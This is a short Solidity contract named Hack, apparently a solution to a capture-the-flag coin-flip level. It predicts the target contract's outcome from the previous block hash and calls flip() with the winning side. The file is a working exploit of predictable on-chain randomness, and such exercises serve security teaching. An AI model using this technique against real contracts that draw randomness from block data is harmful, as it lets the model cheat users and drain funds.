// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol";

import "./coinflip.sol";
contract Hack {
    using SafeMath for uint256;
    CoinFlip cf = CoinFlip(0x465C8c7FEfC427E5344CB80FD5A564eFD8eA78C9);  
    uint FACTOR =  57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() public {
  }

    // run once each block
    function hackFlip() external {
    //   for (uint i = 0; i<10; i++){
    //       cf.flip(true);
    //   }

    //   if (cf.consecutiveWins() == 0) {
    //       for (uint i = 0; i<10; i++){
    //         cf.flip(false);
    //     }
    //   }

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        cf.flip(side);
  }
}